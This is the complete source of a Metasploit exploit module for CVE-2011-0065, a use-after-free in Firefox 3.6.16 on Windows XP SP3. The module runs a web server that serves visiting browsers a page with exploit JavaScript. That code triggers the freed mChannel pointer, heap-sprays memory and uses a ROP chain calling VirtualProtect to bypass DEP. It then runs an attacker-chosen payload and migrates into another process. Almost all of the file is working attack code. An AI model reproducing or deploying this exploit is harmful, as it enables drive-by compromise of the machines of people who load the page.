 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    #
    # This module acts as an HTTP server
    #
    include Msf::Exploit::Remote::HttpServer::HTML
 
    include Msf::Exploit::Remote::BrowserAutopwn
    autopwn_info({
        :ua_name => HttpClients::FF,
        :ua_minver => "3.6.16",
        :ua_maxver => "3.6.16",
        :os_name => OperatingSystems::WINDOWS,
        :javascript => true,
        :rank => NormalRanking,
    })
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Mozilla Firefox 3.6.16 mChannel use after free Exploit&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits an use after free vulnerability in Mozilla
                Firefox 3.6.16. An OBJECT Element mChannel can be freed via the
                OnChannelRedirect method of the nsIChannelEventSink Interface. mChannel
                becomes a dangling pointer and can be reused when setting the OBJECTs
                data attribute. (Discovered by regenrecht). This module uses heapspray
                with a minimal ROP chain to bypass DEP on Windows XP SP3
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;regenrecht&#039;,   #  discovery
                    &#039;Rh0&#039;    # wrote metasploit module
                ],
            &#039;Version&#039;        => &#039;0.0&#039;,
            &#039;References&#039;     =>
                [
                    [&#039;CVE&#039;,    &#039;2011-0065&#039;],
                    [&#039;OSVDB&#039;,  &#039;72085&#039;],
                    [&#039;URL&#039;,    &#039;https://bugzilla.mozilla.org/show_bug.cgi?id=634986&#039;],
                    [&#039;URL&#039;,    &#039;http://www.mozilla.org/security/announce/2011/mfsa2011-13.html&#039;]
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 1024,
                    &#039;BadChars&#039; => "",
                },
            &#039;Targets&#039;        =>
                [   # worked with 100% reliability
                    [ &#039;Firefox 3.6.16, Windows XP SP3 (VirtualBox 4)&#039;,
                        {
                            &#039;Platform&#039; => &#039;win&#039;,
                            &#039;Arch&#039; => ARCH_X86,
                        }
                    ],
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;May 10 2011&#039;
            ))
    end
 
    def on_request_uri(cli, request)
 
        # Re-generate the payload
        return if ((p = regenerate_payload(cli).encoded) == nil)
 
        print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")
        send_response_html(cli, generate_html(p), { &#039;Content-Type&#039; => &#039;text/html&#039; })
 
        # Handle the payload
        handler(cli)
    end
 
    def generate_html(payload)
         
        # DEP bypass
        custom_stack = [
            0x1052c871, # mov esp,[ecx] / mov edx,5c86c6ff add [eax],eax / xor eax,eax / pop esi / retN 0x8
            0x7c801ad4,     # VirtualProtect
            0xbeeff00d,
            0xbeeff00d,
            0x7c874413, # jmp esp
            0x0c0c0048, # start address
            0x00000400, # size 1024
            0x00000040, # Page EXECUTE_READ_WRITE
            0x0c0c0c00  # old protection
            ].pack("V*")
             
        payload_buf = &#039;&#039;
        payload_buf << custom_stack
        payload_buf << payload
        escaped_payload = Rex::Text.to_unescape(payload_buf)
         
        custom_js = %Q|
         
e = document.getElementById("d");
e.QueryInterface(Components.interfaces.nsIChannelEventSink).onChannelRedirect(null,new Object,0)
fake_obj_addr = unescape("\\x0c%u0c0c")
 
// taken and modified from adobe_flashplayer_newfunction.rb
var sc = unescape("#{escaped_payload}")
var ret_addr = unescape("%u0024%u0c0c")
while(ret_addr.length+20+8 < 0x100000) {ret_addr += ret_addr}
var b = ret_addr.substring(0,(0x48-0x24)/2)
b += sc
b += ret_addr
var next = b.substring(0,0x10000/2)
while(next.length<0x800000) {next += next}
var again = next.substring(0,0x80000 - (0x1020-0x08)/2)
array = new Array()
for (n=0;n<0x1f0;n++){
    array[n] = again + sc
}
 
e.data = ""
        |
         
        return %Q|
<html>
<body>
<object id="d"><object>
<script type="text/javascript">
#{custom_js}
</script></body></html>
        |
    end
 
end



